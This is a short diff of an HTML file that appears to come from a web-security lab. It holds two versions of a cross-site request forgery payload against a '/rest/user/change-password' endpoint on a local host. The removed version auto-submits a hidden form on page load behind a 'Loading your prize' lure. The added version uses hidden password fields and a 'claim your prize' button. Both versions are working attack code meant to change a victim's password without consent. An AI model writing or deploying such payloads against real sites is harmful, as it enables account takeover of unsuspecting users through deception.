@@ -1,15 +1,5 @@
-<html>
-  <head>
-    <meta name="referrer" content="no-referrer">
-  </head>
-  <body onload="document.getElementById('csrf-form').submit()">
-    <h1>Loading your prize... Please wait.</h1>
-    
-    <!-- This form mimics a real password change request -->
-    <form action="http://192.168.4.137:3000/rest/user/change-password?new=shiva@123456&repeat=shiva@123456" method="GET" id="csrf-form">
-      <input type="hidden" name="new" value="pwned123" />
-      <input type="hidden" name="repeat" value="pwned123" />
-    </form>
-  </body>
-</html>
-
+<form action="http://192.168.4.137:3000/rest/user/change-password" method="GET">
+  <input type="hidden" name="new" value="shiva@1234567">
+  <input type="hidden" name="repeat" value="shiva@1234567">
+  <input type="submit" value="Click here to claim your prize!">
+</form>
